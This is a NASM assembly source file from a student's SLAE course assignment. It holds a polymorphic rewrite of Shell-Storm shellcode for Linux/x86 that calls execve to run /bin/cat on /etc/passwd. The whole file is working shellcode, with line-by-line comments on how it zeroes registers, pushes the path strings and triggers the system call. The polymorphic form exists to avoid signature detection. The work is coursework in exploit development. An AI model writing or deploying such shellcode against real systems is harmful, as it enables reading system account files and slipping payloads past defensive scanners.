; Student ID     : SLAE-1250
; Student Name   : Jonathan "Chops" Crosby
; Assignment 6.2 : polymorphic bin/cat /etc/passwd for Linux/x86 Assembly
; File Name      : cat-passwd.nasm
; Shell Storm    : http://shell-storm.org/shellcode/files/shellcode-571.php

global _start

section .text

_start:

xor ecx,ecx             ; zero out ecx
mul ecx                 ; will zero out edx and eax
                        ; for more info see the following URL
                        ; https://en.wikibooks.org/wiki/X86_Assembly/Arithmetic
mov ebx, ecx            ; zero out ebx
push edx                ; push null terminator to stack
push dword 0x7461632f   ; tac/
push dword 0x6e69622f   ; nib/
mov ebx,esp             ; move /bin/cat\0 to ebx
push edx                ; push null terminator to stack
push dword 0x64777373   ; dwss
push dword 0x61702f2f   ; ap//
push dword 0x6374652f   ; cte/
mov ecx,esp             ; move /etc//passwd\0 to ecx
mov al,0x0A             ; move 0x0A hex or 10 decimal to eax
inc al                  ; increase eax to be 11 instead of 10
push edx                ; push null terminator to stack
push ecx                ; moves /etc//passwd to stack
push ebx                ; moves /bin/cat to stack
mov ecx,esp             ; moves /bin/cat\0/etc//passwd\0 to ecx
int 0x80                ; execve was just called...
